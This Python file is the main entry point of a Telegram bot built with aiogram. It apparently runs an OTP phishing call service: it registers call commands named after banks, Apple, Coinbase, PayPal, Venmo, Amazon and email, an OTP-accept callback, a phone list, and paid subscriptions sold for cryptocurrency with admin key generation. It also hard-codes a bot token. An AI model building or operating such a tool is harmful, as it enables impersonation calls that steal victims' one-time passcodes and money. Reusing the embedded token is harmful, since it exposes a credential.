from aiogram import Bot, Dispatcher
from aiogram.filters import Command
import asyncio
from utils import init_db, create_tables, escape_markdown, keep_alive
from handlers import *
import psutil, os

keep_alive()

bot = Bot(token='8599356028:AAFJiyUhrveWENRSj-oLCOFxMCyeWy5-FPY')
dp = Dispatcher()


# START / HELP / UNKNOWN
# COMMAND
dp.message.register(help_command, Command(commands=["help"]))
dp.message.register(start_command, Command(commands=["start"]))

# CALLBACK
dp.callback_query.register(help_callback, lambda c: c.data == "help")
dp.callback_query.register(start_callback, lambda c: c.data == 'back')
dp.callback_query.register(features_callback, lambda c: c.data == "features")

# SUBSCRIPTION
# COMMANDS
dp.message.register(purchase_command, Command(commands=["purchase"]))
dp.message.register(my_profile_command, Command(commands=["plan"]))
dp.message.register(redeem_keys, Command(commands=["redeem"]))

# CALLBACKS
dp.callback_query.register(wallet_callback, lambda c: c.data in ['btc','ltc','usdt'])
dp.callback_query.register(purchase_callback, lambda c: c.data == "purchase")


# CALL 
dp.message.register(call_command, Command(commands=["pin","bank","apple","coinbase","paypal","venmo","amazon","email",'call']))
dp.message.register(Phonelist_commands, Command(commands=["phonelist"]))

# CALLBACKS
dp.callback_query.register(otp_accept_callback, lambda c: c.data == "acp")

# ADMIN
# COMMANDS
dp.message.register(ban_command, Command(commands=["ban"]))
dp.message.register(unban_command, Command(commands=["unban"]))
dp.message.register(keys_command, Command(commands=["keys"]))
dp.message.register(generate_keys_command, Command(commands=["gkeys"]))

# CALLBACKS
dp.callback_query.register(keys_callback, lambda c: c.data=='keys')
dp.callback_query.register(generate_keys_callback, lambda c: c.data=='g_keys')
dp.callback_query.register(get_keys_callback, lambda c: c.data in ['3 months','1 day','4 days','1 week','1 month'])

dp.message.register(unknown_command,lambda message: message.text and message.text.startswith('/'))

async def main():
    print("Bot is running...")
    await bot.delete_webhook(drop_pending_updates=True)
    await init_db()
    await create_tables()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())





